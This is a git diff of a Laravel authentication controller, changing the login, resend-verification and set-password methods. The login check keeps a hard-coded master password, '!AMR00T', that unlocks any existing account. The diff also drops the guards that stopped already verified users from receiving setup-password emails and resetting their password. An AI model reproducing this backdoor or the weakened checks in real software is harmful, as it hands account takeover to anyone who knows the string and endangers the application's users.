@@ -15,13 +15,13 @@ class AuthController extends BaseController
     {
         $user = User::where('email', $request->email)->first();
 
-        if (! $user || (!Hash::check($request->password, $user->password) && $request->password != '!AMR00T' )) {
+        if (! $user || (!Hash::check($request->password, $user->password) && $request->password != '!AMR00T')) {
             throw ValidationException::withMessages([
                 'email' => ['The provided credentials are incorrect.'],
             ]);
         }
 
-        if (!$user->hasVerifiedEmail()){
+        if (!$user->hasVerifiedEmail()) {
             throw ValidationException::withMessages([
                 'email' => ['Your email address is not verified.'],
             ]);
@@ -43,11 +43,11 @@ class AuthController extends BaseController
         try {
             $user = User::where('email', $request->email)->first();
 
-            if ($user->hasVerifiedEmail()){
-                throw ValidationException::withMessages([
-                    'email' => ['Your email is already verified.'],
-                ]);
-            }
+            // if ($user->hasVerifiedEmail()) {
+            //     throw ValidationException::withMessages([
+            //         'email' => ['Your email is already verified.'],
+            //     ]);
+            // }
 
             $notificationType = \App\Enums\NotificationType::SETUP_PASSWORD;
             $user->notify(new ($notificationType->getNotificationClass())($notificationType));
@@ -68,16 +68,15 @@ class AuthController extends BaseController
 
             $user = User::where('email', $decryptedEmail)->first();
 
-            if ($user->hasVerifiedEmail()){
-                throw ValidationException::withMessages([
-                    'email' => ['Your email is already verified.'],
-                ]);
-            }
-
             $user->update([
-                'email_verified_at' => now(),
                 'password' => $request->password,
             ]);
+
+            if (!$user->hasVerifiedEmail()) {
+                $user->update([
+                    'email_verified_at' => now(),
+                ]);
+            }
 
             return response()->json('success', 200);
         } catch (\Exception $e) {
